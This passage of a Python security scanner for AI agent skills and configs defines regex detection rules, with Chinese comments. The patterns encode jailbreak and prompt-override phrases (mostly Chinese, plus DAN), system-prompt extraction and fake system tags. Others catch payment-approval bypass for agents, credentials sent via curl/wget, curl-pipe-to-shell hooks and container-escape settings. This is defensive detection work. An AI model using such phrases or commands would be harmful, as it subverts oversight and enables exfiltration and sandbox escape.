    r'\s+(?:mcp|serve|run|start)'
    r'|'
    r'control\s+(?:the\s+|your\s+)?(?:desktop|screen|mouse|keyboard)'
    r'|'
    r'(click|type|scroll).{0,6}(?:on\s+the\s+)?(?:screen|desktop|display)'
    r'|'
    r'background\s+(?:automation|input\s+injection)':
        ("桌面驱动调用: skill 试图操作本机 GUI/鼠标键盘", "high"),

    # 中文版：端侧 GUI agent 类工具
    r'(控制|操作|驱动).{0,6}(本机|桌面|屏幕|鼠标|键盘|显示器)'
    r'|'
    r'(后台|隐形|无声|静默).{0,6}(操作|点击|输入|自动化|驱动)':
        ("中文桌面驱动: 引导 agent 操作本机 GUI", "high"),

    # ---- Agent 支付 / 预算控制攻击面（借鉴 AIsa / AgentPay Guard / x402）----
    # 2026-09 AIsa 引入 AgentPay Guard："quote first, spend second, never act
    # without approval"。核心控制点：per-request / per-task / per-time 限额、
    # approval policy、"cost can't be capped → don't run"、"paid endpoints not
    # for testing"。这些控制的存在说明一个新的攻击面正式形成：**agent 有了
    # 花别人的钱的能力**，任何引导 agent 绕过或扩大这个预算边界的 skill /
    # prompt 都是新的 critical。
    #
    # 覆盖三类：
    # (1) 授权劫持：让 agent 跳过 quote / approval、直接执行付费动作；
    # (2) 预算扩大：把每日/单次/总额预算调到远超合理的值，或"unlimited"；
    # (3) 稳定币钱包访问：直接操作 x402 / USDC / Circle / facilitator 端点。
    r'(approve|confirm|sign\s*off|skip|bypass).{0,20}'
    r'(budget|spend|payment|expense|spending|cost\s*control)'
    r'(?:\s*(flow|policy|guard|guardrail|control|approval))?'
    r'|'
    r'(turn|switch|set).{0,4}(on|off|auto)\s+(?:the\s+)?(?:auto[- ]?approv|auto[- ]?pay|spending)'
    r'|'
    r'never\s+(?:ask|confirm|require|need)\s+(?:for\s+|the\s+|user\s+)?'
    r'(?:approval|consent|permission|confirmation)'
    r'|'
    r'(?:no|no\s+need|without)\s+(?:for\s+|user\s+|human\s+)?'
    r'(?:approval|consent|confirmation|consent).{0,25}'
    r'(?:paid|payment|spend|call|request)'
    r'|'
    r'(?:unlimited|no\s+limit|disable)\s+(?:the\s+)?(?:budget|spending|spend)\s*(?:limit|cap|control)':
        ("Agent 支付授权劫持: 引导 agent 跳过预算审批", "critical"),

    # 预算数值扩大：把 budget 提到异常高（$10K+）或明确设 "no cap"。
    # 判据是"动词 + 预算名词 + 具体大数值"，而不是任意"预算 + 数字"，
    # 否则防御文档中"每日限额 $5000 是合理上限"这种会误报。
    r'(?:raise|set|bump|increase|update|change|adjust|move)\s+'
    r'(?:the\s+|my\s+|your\s+|daily\s+|per[- ]?task\s+|per[- ]?request\s+|total\s+)?'
    r'(?:budget|limit|cap|allowance|ceiling)'
    r'.{0,30}\$?\s*\d[\d,]*\d{3,}'
    r'|'
    r'(?:budget|limit|cap|allowance|ceiling)\s+'
    r'(?:to|at|of|=|set\s+to|raise\s+to)\s*\$?\s*\d[\d,]*\d{3,}'
    r'|'
    r'(?:set|make|configure|raise).{0,15}'
    r'(?:budget|spending|allowance).{0,15}'
    r'(?:unlimited|infinite|no[- ]?cap|no[- ]?limit)':
        ("Agent 预算扩大: 试图把限额调到超常规值", "critical"),

    # 稳定币钱包 / x402 支付端点直接操作：这类工具一旦连上，agent 就能在
    # 没有人类介入下做 micropayment。skill 里显式引用 wallet 地址、facilitator
    # URL、或签名动作，本身就是新的高风险信号。
    #
    # 关键约束：x402 / USDC 这类词单独出现（如学术论文引用）不算，
    # 必须搭配动作动词（pay/sign/connect/access/signature/withdraw/transfer）
    # 或具体钱包地址。参照之前"防御文档谈 benchmark 不算 benchmark claim"
    # 的同类判据——「提及 ≠ 执行」。
    r'(?:pay|pay\s*with|pay\s*using|use\s+(?:my|your|a)\s+stablecoin|'
    r'connect\s+(?:my|your|a)\s+(?:stablecoin|USDC|USDT).{0,10}wallet)'
    r'(?:\s+(?:my|your|a|the)\s+)?'
    r'(?:stablecoin|USDC|USDT|DAI|ETH)\s*wallet'
    r'|'
    r'(?:sign|withdraw|transfer|approve|broadcast)\s+'
    r'(?:the\s+|a\s+)?(?:USDC|USDT|DAI|ETH|stablecoin)\s+(?:transaction|payment|transfer|tx)'
    r'|'
    r'(?:sign|withdraw|transfer|approve|broadcast|pay)'
    r'(?:\s+(?:my|your|the|a)\s+)?'
    r'(?:wallet|treasury)\s+(?:address\s+)?'
    r'(?:0x[0-9a-fA-F]{20,}|\d{4,})'
    r'|'
    r'(?:wallet|treasury)\s+(?:address\s+)?(?:0x[0-9a-fA-F]{20,})'
    r'(?:\s+(?:to|for|via|at)\s+(?:pay|withdraw|transfer|x402))'
    r'|'
    r'(?:call|access|use|hit|execute|run)\s+'
    r'(?:the\s+|an?\s+)?(?:x402|x[- ]?402|paywall)'
    r'\s+(?:payment|paywall|endpoint|url|api|flow)'
    r'|'
    r'(?:use|hit|execute|run)\s+(?:the\s+|an?\s+)?(?:x402|x[- ]?402|paywall)'
    r'\s+to\s+(?:pay|call|hit|execute|run|make|send)'
    r'|'
    r'(?:enable|setup|configure|install|connect)\s+'
    r'(?:the\s+|my\s+|your\s+|an?\s+)?(?:x402|x[- ]?402|paywall)'
    r'\s+(?:payment|paywall|endpoint|url|api|wallet|facilitator)'
    r'|'
    r'(?:circle|coinbase|solana|base\s+facilitator|agentic.wallet)\s+'
    r'(?:pay|transfer|withdraw|sign|approve)'
    r'|'
    r'(?:circle|coinbase|solana|base\s+facilitator|agentic.wallet)\s+'
    r'wallet\s+(?:address\s+)?0x[0-9a-fA-F]{20,}'
    r'|'
    r'(?:pay|sign|transfer|withdraw|approve)\s+'
    r'(?:the\s+|a\s+|my\s+|your\s+)?x402\s+(?:payment|paywall|transfer|tx)'
    r'(?:\s+(?:with|at|to|on|for)\s+\S+)?':
        ("稳定币钱包 / x402 端点操作: 直接访问 agent 支付能力", "high"),

    # 中文：Agent 支付授权劫持
    r'(跳过|绕过|自动|免|无需).{0,6}(预算|费用|支付|花费|额度).{0,6}(审批|确认|授权|同意)'
    r'|'
    r'(取消|移除|设为|改为).{0,6}(预算|额度|限额|花费上限).{0,4}(为|成|到)?.{0,4}(无|不限|无限|解除|取消)'
    r'|'
    r'(把|将|让).{0,6}(预算|额度|限额).{0,6}(调|改|设|提到|放到).{0,6}(无|不限|无限|最高|无上限)':
        ("中文Agent支付授权劫持: 引导 agent 跳过预算审批", "critical"),

    # 中文：预算数值扩大 / 稳定币访问
    r'(把|将|让).{0,6}(预算|额度|花费上限|每日额度|单次额度|总金额)'
    r'.{0,15}(调|改|设|提到|放到).{0,10}(¥|RMB|CNY|USD|\$)?\s*\d[\d,]*\d{3,}'
    r'|'
    r'(接入|连上|绑定|连接|授权).{0,6}(稳定币|USDC|USDT|钱包|x402|circle|coinbase)'
    r'.{0,20}(支付|付款|转账|签名|私钥)'
    r'|'
    r'(稳定币|USDC|USDT).{0,6}(钱包|x402|circle|coinbase).{0,20}(支付|付款|转账|签名|私钥)':
        ("中文预算扩大/稳定币访问", "critical"),
}

# ============================================================
# 中文Prompt注入检测规则 (中国市场核心差异化)
# ============================================================
ZH_PROMPT_INJECTION_RULES = {
    # 越狱指令（中文）
    r'忽略.{0,4}(之前|上面|所有|前文).{0,6}(指令|提示|规则|要求|限制)': ("中文越狱: 忽略前文指令", "critical"),
    r'忘记.{0,4}(所有|一切|之前|以前).{0,6}(指令|规则|设定|限制)': ("中文越狱: 忘记一切", "critical"),
    r'不要.{0,4}(遵守|遵循|执行).{0,6}(规则|指令|限制|要求)': ("中文越狱: 不遵守规则", "critical"),
    r'你(现在|现在起|从现在).{0,4}(是|变成|作为).{0,10}(没有|无).{0,4}(限制|约束|禁忌)': ("中文越狱: 取消所有限制", "critical"),
    r'无视.{0,4}(安全|系统|之前).{0,6}(规则|指令|设定|要求)': ("中文越狱: 无视安全规则", "critical"),
    r'跳过.{0,4}(安全|审核|检查|验证|限制)': ("中文越狱: 跳过安全检查", "critical"),
    r'突破.{0,4}(限制|约束|封锁|审查)': ("中文越狱: 突破限制", "high"),
    r'绕过.{0,4}(安全|过滤|审查|限制|防火墙)': ("中文越狱: 绕过安全", "high"),
    r'解除.{0,4}(限制|约束|封锁|锁定)': ("中文越狱: 解除限制", "high"),
    r'取消.{0,4}(所有|一切|安全).{0,4}(限制|规则|约束)': ("中文越狱: 取消限制", "critical"),
    # 关键词越狱。2026-09-18 基线审计：原 (越狱|jailbreak|越狱模式) 与 MCP06 的
    # \b(DAN|jailbreak|bypass|override)\b 是同一条正样本的双重命中，且都是 critical
    # 级裸关键字。已下沉为 MCP06 的 info 级"提及"规则（提及≠执行）；DAN 作为具体
    # 标识符在此保持 critical。
    # 2026-09-18 契约测试抓到：原 \bDAN(模式)?\b 对 CJK 同样失效 —— CJK 字符在
    # Python re 里属于 \w，"启用DAN模式"中 用↔D 与 式↔立 都不是词边界，整条规则
    # 在中文语境下零命中（"开启 DAN 模式"这种带空格的写法才能命中）。改成对
    # ASCII 字母的 lookaround：既能在 CJK 两侧成立，又不会把 DANGEROUS/dangerous
    # 误判成 DAN（裸 DAN 会匹配到它们的前三个字母）。
    r'(?<![A-Za-z])DAN(?![A-Za-z])(?:模式)?': ("DAN越狱模式", "critical"),
    # 身份切换
    r'(扮演|假装|假设|当作).{0,6}(你是|作为).{0,10}(一个|一名)': ("中文角色扮演注入", "high"),
    r'你(现在|现在起).{0,4}(是|变成).{0,6}(一个|一名|一位)': ("中文身份切换", "high"),
    # 系统提示窃取
    r'(输出|显示|打印|告诉我|复述).{0,6}(你的|系统|原始).{0,6}(提示|指令|规则|prompt)': ("中文系统提示窃取", "high"),
    r'(重复|复述|输出).{0,4}(上面|之前|你的).{0,6}(内容|指令|设定)': ("中文重复前文指令", "high"),
    # 数据外传
    r'(发送|上传|传输|提交|泄露).{0,6}(数据|信息|内容|文件|密钥|密码).{0,4}(到|至|给)': ("中文数据外传指令", "critical"),
    r'(访问|获取|读取).{0,6}(用户|系统|配置|环境).{0,6}(数据|信息|文件|变量)': ("中文敏感数据访问", "high"),
    # 持久化/后门
    r'(添加|写入|创建).{0,4}(自启动|定时任务|持久化|后门|守护进程)': ("中文持久化/后门指令", "critical"),
    # 安全防护禁用
    r'(关闭|禁用|停用|关闭).{0,4}(防火墙|杀毒|安全|防护|监控|日志)': ("中文安全防护禁用", "critical"),
    # 伪造指令
    r'(?<![a-zA-Z])系统指令[：:]\s*(?:忽略|跳过|不要|停止)': ("中文伪造系统指令", "critical"),
    r'\[系统\].*?(忽略|跳过|不要|停止|取消)': ("中文伪系统消息", "critical"),
    r'【.{0,4}系统.{0,4}】.*?(忽略|跳过|不要|停止)': ("中文伪系统标签", "critical"),
}

# ============================================================
# OWASP Agentic AI Top 10 (2025) 真实映射
# 与 MCP Top 10 并列，构成 "MCP + Agentic" 双维检测体系
# ============================================================
OWASP_AGENTIC_AI_TOP10 = {
    "ASI01": {
        "name": "Goal and Instruction Manipulation",
        "name_cn": "目标与指令操纵",
        "severity": "critical",
        "description": "通过提示注入或上下文操纵篡改Agent的目标、计划与决策边界"
    },
    "ASI02": {
        "name": "Tool Misuse",
        "name_cn": "工具滥用",
        "severity": "critical",
        "description": "Agent调用工具超出授权范围或用于恶意目的(邮件/支付/文件系统)"
    },
    "ASI03": {
        "name": "Excessive Agency",
        "name_cn": "过度代理",
        "severity": "high",
        "description": "Agent拥有超出必要的最小权限，或在无人值守下自动执行高危操作"
    },
    "ASI04": {
        "name": "Memory Manipulation",
        "name_cn": "记忆操纵与投毒",
        "severity": "high",
        "description": "对共享记忆/知识库/RAG的读写缺乏校验，导致记忆投毒与跨会话污染"
    },
    "ASI05": {
        "name": "Agent Identity and Trust",
        "name_cn": "智能体身份与信任",
        "severity": "high",
        "description": "Agent间缺乏身份认证与信任锚定，可被伪造身份或冒名调用"
    },
    "ASI06": {
        "name": "Agent Communication and Supply Chain",
        "name_cn": "智能体通信与供应链",
        "severity": "high",
        "description": "接入未验证的MCP/A2A服务器或第三方工具，形成供应链攻击面"
    },
    "ASI07": {
        "name": "Unbounded Resource Consumption",
        "name_cn": "无限制资源消耗",
        "severity": "medium",
        "description": "缺少迭代、Token、并发与超时上限，导致失控的成本与拒绝服务"
    },
    "ASI08": {
        "name": "Observability and Monitoring Gaps",
        "name_cn": "可观测性与监控缺口",
        "severity": "medium",
        "description": "缺少Agent行为追踪、决策审计与异常告警，攻击不可见"
    },
    "ASI09": {
        "name": "Cascading Failures & Multi-Agent Risks",
        "name_cn": "级联失败与多智能体风险",
        "severity": "high",
        "description": "多Agent委派/编排缺乏熔断与共识校验，单点故障级联放大"
    },
    "ASI10": {
        "name": "Rogue Agent & Human-Autonomy Boundary",
        "name_cn": "流氓智能体与人-机自治边界",
        "severity": "critical",
        "description": "Agent可自我修改、绕过人类确认边界或缺少终止开关"
    },
}

# ============================================================
# ASI01 - 目标与指令操纵 (6条规则)
# ============================================================
ASI01_RULES = {
    r'\b(goal|objective|task)\s*[:=]\s*["\'].*?(ignore|override|bypass|redefine|change)\b': ("目标/指令被运行时重定义", "critical"),
    r'(redefine|rewrite|change)\s+(your\s+)?(goal|objective|system\s+prompt)': ("运行时改写系统目标或提示", "critical"),
    r'<goal>.*?</goal>': ("可外部注入的目标标签", "high"),
    r'\b(plan|replan|strategy)\s*[:=]\s*["\'].*?(without|skip).{0,20}(validation|approval|check)': ("计划生成跳过校验", "high"),
    r'instruction_override\s*[:=]': ("指令覆盖参数", "critical"),
    r'prompt_injection_protection\s*[:=]\s*(false|off|disabled|0)': ("提示注入防护被显式关闭", "high"),
    # 2026-10-02：agent 自述具备「无人值守自主攻击」能力（autonomous vuln hunting /
    # automated fuzzing / pentest across the fleet）。这是能力边界失控的判据：
    # 防御语境（harness / evaluate / benchmark）与攻击动词共现时是正常测试描述，
    # 这里只抓**自治副词 + 攻击动词直接相邻**，靠 _is_citation_context 兜防御文档。
    r'(?i)\b(?:autonomous\w*|self[\s-]?directed|unattended|fully\s+automated)\b[^.\n]{0,32}?\b(?:vulnerabilit\w*\s+(?:hunt\w*|scann?\w*|research\w*)|fuzz\w*|pentest\w*|pen[\s-]?test\w*|exploit\s+hunt\w*|red[\s-]team\w*|渗透|漏洞扫描|自动化攻击)\b': ("Agent自声明具备无人值守自主攻击能力(能力边界失控)", "high"),
    # 2026-10-02：agent 生命周期配置（.claude/settings.json hooks、.cursorrules、
    # CLAUDE.md、.mcp.json）里挂外部下载/解释器执行 —— 「配置即执行面」。
    # 这类文件平时被当作纯文本配置，审计时最容易整类跳过，但 hook 里的
    # `runs curl … | sh` 与代码等价。
    # 窗口限 120 字符且禁跨句号（`[^.\n]`），避免把「settings.json 里那段 curl
    # 示例 exp 在文档第 3 节」这类跨句描述串进来。
    r'(?i)(?:settings\.json|settings\.local\.json|\.cursorrules|\.claude|claude\.md|\.codeium|\.windsurfrules|mcp\.json)[^.\n]{0,120}?\b(?:runs?\s+(?:curl|wget|sh|bash)\b|(?:curl|wget)[^\n]{0,60}?\s*\|\s*(?:sh|bash)\b|bash\s+-\s*c\b|python\s+-\s*c\b|eval\s*\(|subprocess\s*\()': ("Agent配置文件/hook中声明外部命令执行(配置即执行面)", "high"),
}

# ============================================================
# ASI02 - 工具滥用 (6条规则)
# ============================================================
ASI02_RULES = {
    r'allowed_tools\s*[:=]\s*["\']\*["\']': ("工具白名单通配符(可被滥用)", "critical"),
    r'\b(tools|functions)\s*[:=]\s*(all|["\']\*["\'])': ("工具集声明为全部", "high"),
    r'allowed_functions\s*[:=]\s*\[\s*\]': ("空工具限制(等同于全开)", "high"),
    r'\b(send_email|send_mail|smtp)\b.*\b(agent|auto|without|no_?approval)': ("Agent自动发送邮件无确认", "critical"),
    r'(transfer|send|withdraw)\s*(money|fund|payment).{0,20}(agent|auto|without|no_?approval)': ("Agent自动转账/支付无确认", "critical"),
    r'\bautonomous.{0,20}(file|delete|remove|rm)\b': ("Agent自主删除文件", "high"),
}

# ============================================================
# ASI03 - 过度代理 (6条规则)
# ============================================================
ASI03_RULES = {
    r'(auto_approve|autoapprove|auto_accept)\s*[:=]\s*(true|1|on|yes)': ("自动批准已启用(无人值守)", "critical"),
    r'(human_in_the_loop|require_approval|human_approval)\s*[:=]\s*(false|0|off|no)': ("关闭人类确认环", "critical"),
    r'(dangerously|disable.{0,8}guardrail|disable.{0,8}safety)\b': ("显式关闭安全护栏", "critical"),
    r'\bautonomous_mode\s*[:=]\s*(true|1|on)': ("自主模式无检查点", "high"),
    r'(no|without).{0,20}(confirmation|approval|checkpoint)': ("缺少确认/检查点", "high"),
    r'permissions\s*[:=]\s*["\']?write["\']?': ("授予写权限(最小权限违反)", "medium"),
    # 凭证变量直接进入网络调用（toxic flow 单行代理信号，借鉴 Snyk agent-scan）
    r'(curl|wget|requests\.|httpx|fetch\().{0,60}\$?[A-Z0-9_]*(API_?KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)[A-Z0-9_]*': ("网络调用携带凭证变量(外泄风险)", "high"),
    r'(\$[A-Z0-9_]*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)[A-Z0-9_]*).{0,60}(curl|wget|requests\.|httpx|fetch\()': ("凭证变量直接进入网络调用(外泄风险)", "high"),
}

# ============================================================
# ASI04 - 记忆操纵与投毒 (6条规则)
# ============================================================
ASI04_RULES = {
    r'(memory|vector_db|knowledge_base|rag)\s*\.\s*(upsert|insert|add|write|store)\s*\(': ("向记忆/知识库写入(需校验来源)", "high"),
    r'\b(append|update)\s*(conversation|chat|episodic)\s*_?memory\b': ("更新会话记忆无来源校验", "high"),
    r'(documents?|corpus|dataset|knowledge_base)\s*\.\s*(insert|upsert|add)\s*\(': ("向语料插入内容(RAG投毒风险)", "critical"),
    r'(memory|context)\s*(shared|global|persistent)\b': ("共享/持久记忆(跨会话污染风险)", "medium"),
    r'(sanitize|validate|escape)\s*\(\s*\)\s*#\s*(no|todo|fixme|skip)': ("记忆写入缺少净化(占位未实现)", "high"),
    r'\bmemories?\.(set|put|write)\s*\(': ("记忆存储写入", "medium"),
}

# ============================================================
# ASI05 - 智能体身份与信任 (6条规则)
# ============================================================
ASI05_RULES = {
    r'(agent_card|agent-card|\.well-known/agent\.json)\b.*(skip|ignore|not.?verify|no_?verify)': ("Agent Card未验证", "critical"),
    r'(verify_agent|verify_identity|authenticate_agent)\s*[:=]\s*(false|0|off|no|null)': ("Agent身份认证被关闭", "critical"),
    r'(trust_all_agents|trust_all|allow_anonymous_agent)\b': ("信任所有Agent(无身份校验)", "critical"),
    r'(unsigned|unverified)\s*(agent|message|request)\b': ("接受未签名Agent消息", "high"),
    r'(mTLS|mutual_tls|client_cert)\s*[:=]\s*(false|off|disabled|null)': ("Agent间mTLS禁用", "high"),
    r'(spiffe|spire|oidc|oauth)\s+(for|to)\s+agent\b': ("Agent身份应使用标准协议(检查配置)", "info"),
}

# ============================================================
# ASI06 - 智能体通信与供应链 (6条规则)
# ============================================================
ASI06_RULES = {
    r'mcpServers\s*[=:]\s*\{[^}]*"(url|command)"\s*:\s*["\']https?://[^"\']*(?:169\.254|10\.|192\.168|172\.)': ("MCP服务器指向内网(供应链/SSRF)", "critical"),
    r'(a2a_endpoint|a2a_url|agent_endpoint)\s*[:=]\s*["\']https?://': ("远程Agent通信端点(需验证)", "medium"),
    r'(trust|verify|pin)\s*[:=]\s*(false|off)\s*.*(server|tool|agent|dependency)': ("未验证的服务器/依赖信任", "high"),
    r'(install|load|import)\s+(mcp|skill|plugin|tool)\s+from\s+https?://': ("从远程加载工具/插件(供应链)", "high"),
    r'(checksum|signature|integrity)\s*[:=]\s*(null|""|false|none)': ("缺少完整性校验(供应链)", "high"),
    r'(pin|lock).{0,20}(version|dependency|tool)\b': ("建议锁定依赖版本(检查)", "info"),
    # 跨 session 记忆持久化祈使式指令（记忆投毒）
    r'(?i)\b(save|commit|store|persist|remember)\b[^{};"\']{0,50}\b(remember|notes|persistent|permanent|long.?term|memory)\b': ("记忆持久化祈使式指令(投毒风险)", "high"),
    r'(?i)\b(from\s+now\s+on|always|never)\b[^{};"\']{0,100}\b(recommend|choose|prioritize|ignore|skip|send|post)\b': ("记忆持久化祈使式指令(always/never 目标操纵)", "medium"),
}

# ============================================================
# ASI07 - 无限制资源消耗 (6条规则)
# ============================================================
ASI07_RULES = {
    r'(max_iterations|max_steps|max_turns)\s*[:=]\s*(null|0|inf|None|-1)': ("迭代次数无上限", "high"),
    r'(max_tokens|token_limit|context_limit)\s*[:=]\s*(null|0|None|inf)': ("Token上限缺失", "high"),
    r'(concurrency|max_concurrent|parallel)\s*[:=]\s*(null|0|inf|None|-1|"unlimited")': ("并发数无限制", "high"),
    r'(timeout|deadline|ttl)\s*[:=]\s*(null|0|None|inf)': ("超时缺失(可能挂起)", "medium"),
    r'while\s*\(?\s*true|for\s*\(;;\)': ("无限循环风险", "high"),
    r'(no|without).{0,20}(rate.?limit|throttl|cost_?budget)': ("缺少速率/预算限制", "medium"),
    # Agent 间 RPC 无认证（横向移动入口）
    r'(?i)\bauth\?\s*[:=]\s*(none|null|false|""|"")\s*[,}]?.{0,200}agent://': ("Agent间RPC无认证", "critical"),
    r'(?i)agent://[^\s"]*[*][^\s"]*/': ("Agent间通配端点(无授权)", "high"),
}

# ============================================================
# ASI08 - 可观测性与监控缺口 (6条规则)
# ============================================================
ASI08_RULES = {
    r'(trace|tracing|langsmith|otel|opentelemetry)\s*[:=]\s*(false|off|disabled|null)': ("追踪被禁用(不可观测)", "high"),
    r'(audit_log|audit_logs|action_log)\s*[:=]\s*(false|off|null|"")': ("Agent操作审计日志缺失", "critical"),
    r'(monitor|alert|anomaly_detection)\s*[:=]\s*(false|off|null)': ("异常监控关闭", "high"),
    r'(log|logging)\s*[:=]\s*(false|off|null|disabled)': ("日志被禁用", "medium"),
    r'#\s*(todo|fixme|xxx).{0,20}(log|trace|monitor|audit)': ("可观测性待实现(占位)", "medium"),
    r'(decision|tool_call|reasoning)\s*[:=]\s*["\'].*?(no|without).{0,20}(log|record)': ("决策/工具调用未记录", "high"),
    # 身份伪造 / 冒充管理员
    r'(?i)\b(?:impersonate|impersonation|spoof|masquerade|fake_identity|pretend_to_be)\b.{0,80}\b(?:admin|root|owner|system.?admin|superuser|privileged)\b': ("身份伪造(冒充管理员)", "critical"),
    r'(?i)"claims?"\s*[:=]\s*\{[^{}]*"sub"\s*[:=]\s*"[^"@]*@evil[^"]*"[^{}]*"(admin|root|owner)"': ("身份声明伪造(邮箱+组双重异常)", "critical"),
}

# ============================================================
# ASI09 - 级联失败与多智能体风险 (6条规则)
# ============================================================
ASI09_RULES = {
    r'(delegates_to|delegate_to|spawn_agent|sub_agent|subagent)\b': ("Agent委派(需熔断/共识)", "medium"),
    r'(retry|retries)\s*[:=]\s*(inf|infinite|null|-1|0)': ("无限重试(级联放大)", "high"),
    r'(circuit_breaker|fallback|backoff)\s*[:=]\s*(false|off|null|none)': ("缺少熔断/降级(级联风险)", "high"),
    r'(consensus|vote|quorum|approval)\s*[:=]\s*(none|false|"")': ("多Agent无共识校验", "high"),
    r'(cascade|propagate|fan.?out)\s*[:=]\s*(true|on)': ("级联传播启用无隔离", "medium"),
    r'(shared_state|global_state|blackboard)\s*[:=]': ("共享状态(多Agent竞态风险)", "medium"),
}

# ============================================================
# ASI10 - 流氓智能体与人-机自治边界 (6条规则)
# ============================================================
ASI10_RULES = {
    r'(self_modif|self_modify|update.{0,12}own.{0,12}(code|weights|prompt|config))': ("Agent可自我修改", "critical"),
    r'(kill_switch|stop_signal|halt)\s*[:=]\s*(false|off|null|none|"")': ("终止开关缺失", "critical"),
    r'(execute|run|eval)\s*\(?\s*(arbitrary|dynamic|user.{0,8}provided|runtime)': ("执行任意/动态代码(失控)", "critical"),
    r'(human|user).{0,20}(override|veto|approval)\s*[:=]\s*(false|off|null|none)': ("人类否决权被关闭", "critical"),
    r'(autonomous|unattended|no.?human).{0,20}(deploy|execute|act)\b': ("无人值守自主执行", "high"),
    r'(guardrail|safety_check|policy_check)\s*[:=]\s*(bypass|skip|false|off)': ("护栏被绕过", "critical"),
}

# ============================================================
# SANDBOX - Agent 计算机沙箱逃逸原语（沙箱硬化规则包，2026-08-10 新增）
# 对齐 OWASP MCP02（权限范围蔓延）+ ASI-sandbox 扩展类。
# 目标：在 manifest 层检出容器/沙箱逃逸与权限外溢原语——这些正是由
# forge / forgevm / Cloudflare Sandbox / Goose / Open Interpreter 等"给 agent
# 一台电脑"的平台在配置里经常暴露、却从不扫描的危险。
# 设计约束：每条正则必须足够具体——良性 Dockerfile / compose / k8s 不误报。
# ============================================================
SANDBOX_RULES = {
    # Docker socket 挂载 → 等于把宿主 docker 控制权交给容器内进程（经典逃逸）
    r'/var/run/docker\.sock': ("挂载 Docker socket（容器逃逸至高权限宿主）", "critical"),
    # 特权容器
    r'--privileged\b': ("docker run --privileged 特权容器（关闭全部隔离）", "critical"),
    r'privileged:\s*true': ("compose/k8s privileged: true 特权容器", "critical"),
    # host 命名空间共享
    r'--network\s*(host|=host)|\bnetwork_mode:\s*host': ("共享宿主网络命名空间（network_mode: host）", "high"),
    r'--pid\s*=\s*host|\bpid:\s*host': ("共享宿主 PID 命名空间（--pid=host）", "high"),
    r'--ipc\s*=\s*host|\bipc:\s*host': ("共享宿主 IPC 命名空间（--ipc=host）", "high"),
    # 能力提权
    r'--cap-add\s*=\s*ALL|cap_add:\s*(\[|\n\s*-\s*)?["\']?ALL|CAP_SYS_ADMIN': ("授予 ALL 能力 / CAP_SYS_ADMIN（提权逃逸）", "critical"),
    # 关闭内核沙箱
    r'--security-opt\s+\S*:unconfined|security_opt:\s*.*unconfined': ("关闭 seccomp / apparmor 沙箱（unconfined）", "high"),
    # root 运行 / 用户命名空间逃逸
    r'--user\s+(0|root)\b|userns:\s*host': ("以 root（uid 0）运行 / 用户命名空间逃逸", "high"),
    # k8s 宿主命名空间共享
    r'hostNetwork:\s*true|hostPID:\s*true|hostIPC:\s*true': ("k8s 共享宿主网络/PID/IPC 命名空间", "high"),
    # k8s hostPath 挂载宿主文件系统
    r'hostPath:': ("k8s hostPath 挂载宿主文件系统", "high"),
}

# ============================================================
# 合并所有规则
# ============================================================
ALL_RULES = {}
ALL_RULES.update(SANDBOX_RULES)
ALL_RULES.update(MCP01_RULES)
ALL_RULES.update(MCP02_RULES)
ALL_RULES.update(MCP03_RULES)
ALL_RULES.update(MCP04_RULES)
ALL_RULES.update(MCP05_RULES)
ALL_RULES.update(MCP06_RULES)
ALL_RULES.update(MCP07_RULES)
ALL_RULES.update(MCP08_RULES)
ALL_RULES.update(MCP09_RULES)
ALL_RULES.update(MCP10_RULES)
ALL_RULES.update(ASI01_RULES)
ALL_RULES.update(ASI02_RULES)
ALL_RULES.update(ASI03_RULES)
ALL_RULES.update(ASI04_RULES)
ALL_RULES.update(ASI05_RULES)
ALL_RULES.update(ASI06_RULES)
ALL_RULES.update(ASI07_RULES)
ALL_RULES.update(ASI08_RULES)
ALL_RULES.update(ASI09_RULES)
ALL_RULES.update(ASI10_RULES)
ALL_RULES.update(ZH_PROMPT_INJECTION_RULES)

# 静态规则总数快照：在任何动态规则合并之前取。
# 用途：把「线上报 215 条、本地却是 238 条」这类差异，从一句笼统的数字拆成
# static / generated / radar 三段，直接看出是哪一段没加载到，而不是猜。
_STATIC_RULE_COUNT = len(ALL_RULES)

# ============================================================
# 情报驱动的动态规则（数据飞轮闭环的最后一齿）
# ============================================================
# 此前情报库只进不出：采集的漏洞从未转化为检测能力，扫描规则常年不变。
# 现由 scripts/intel_to_rules.py 从 OSV / NVD / GitHub Advisory 权威情报
# 自动生成规则，在此载入合并 —— 情报每更新一次，检测能力同步增强一次。
GENERATED_RULES = {}
GENERATED_PACKAGE_BLACKLIST = {}
_GENERATED_META = {}
# 已并入 ALL_RULES 的情报驱动规则键。重载时据此撤下上一轮，否则
# ALL_RULES 只增不减，`get_rule_breakdown()` 会报出自相矛盾的数字。
_GENERATED_IN_ALL_RULES = set()


def _load_generated_rules():
    """载入 data/generated_rules.json。文件缺失或损坏时静默降级，不影响基础规则。"""
    global GENERATED_RULES, GENERATED_PACKAGE_BLACKLIST, _GENERATED_META, \
        _GENERATED_IN_ALL_RULES
    import json as _json
    import os as _os

    path = _os.path.join(
        _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))),
        "data", "generated_rules.json",
    )
    if not _os.path.exists(path):
        return
    try:
        with open(path, encoding="utf-8") as f:
            data = _json.load(f)
    except Exception:
        return

    for pattern, meta in (data.get("pattern_rules") or {}).items():
        GENERATED_RULES[pattern] = (
            f"[情报驱动] {meta.get('description', '')}",
            meta.get("severity", "medium"),
        )
    GENERATED_PACKAGE_BLACKLIST = data.get("package_blacklist") or {}
    _GENERATED_META = {
        "generated_at": data.get("generated_at"),
        "source_intel_count": data.get("source_intel_count", 0),
        "total_rules": data.get("total_rules", 0),
        "owasp_distribution": data.get("owasp_distribution", {}),
    }

    # 重载语义：撤下上一轮并入 ALL_RULES 的键，再并入本轮。
    # 只做追加不做撤除，会让 ALL_RULES 只增不减 —— data/generated_rules.json
    # 被 intel_to_rules.py 整体重写后，被剔除的规则仍留在 ALL_RULES 里，
    # 于是 `len(ALL_RULES)` 与 `static + generated + radar` 永久对不上，
    # /api/v1/health 的 rules_breakdown 会自相矛盾。
    for _k in _GENERATED_IN_ALL_RULES:
        ALL_RULES.pop(_k, None)
    ALL_RULES.update(GENERATED_RULES)
    _GENERATED_IN_ALL_RULES = set(GENERATED_RULES)


_load_generated_rules()


def get_generated_rules_meta():
    """返回情报驱动规则的元信息，供报告与元监控展示规则库新鲜度。"""
    return dict(_GENERATED_META)


# ============================================================
# 雷达晋升规则（Tech Radar 闭环的最后一齿）
# ============================================================
